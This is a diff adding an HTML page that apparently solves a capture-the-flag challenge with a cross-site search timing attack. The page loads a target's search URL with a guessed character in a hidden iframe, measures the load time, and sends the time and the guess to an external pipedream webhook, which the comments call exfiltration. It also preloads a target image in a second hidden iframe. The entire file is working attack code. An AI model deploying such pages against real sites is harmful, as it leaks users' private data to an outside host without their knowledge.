@@ -1,0 +1,53 @@
+<html>
+    <head>
+        <script>
+            // This function runs after the iframe loads and sends timing stats
+            function runTest(param) {
+                // Wait for the iframe to load (~500ms)
+                setTimeout(() => {
+
+                    // URL to load for the flag
+                    var url_to_load = 'http://125.138.133.213:44444/search?query=S';
+
+                    // Webhook URL to report (exfiltration)
+                    var wh_url = 'https://eo92jpwn05w7j5i.m.pipedream.net';
+
+                    var start = window.performance.now();
+
+                    // Create an iframe element for the YANA page
+                    var iframe = document.createElement('iframe');
+                    iframe.style.display = 'none'; // Hide the iframe
+                    iframe.src = url_to_load; // Set the src to the YANA.html#flag URL
+                    document.body.appendChild(iframe);
+
+                    // Listen for the iframe load event
+                    iframe.onload = function() {
+                        var end = window.performance.now();
+                        var timing = end - start;
+
+                        // Exfiltrate the load time for the iframe page
+                        fetch(wh_url + '/NO?status=200&time=' + timing + '&key=' + encodeURIComponent(param));
+
+                        // Optionally, you can remove the iframe after it's loaded
+                        iframe.remove();
+                    };
+                }, 500);
+            }
+
+            
+
+        </script>
+    </head>
+    <body>
+        <!-- Run the test function with the "no flag" string -->
+        <script>
+            // Before running runTest, add a new iframe for the 1.jpg image
+            var iframe_image = document.createElement('iframe');
+            iframe_image.style.display = 'none';  // Hide the iframe
+            iframe_image.src = 'http://125.138.133.213:44444/static/images/1.jpg';  // Image URL
+            document.body.appendChild(iframe_image);  // Append iframe to the body
+          
+            runTest("S");
+        </script>
+    </body>
+</html>
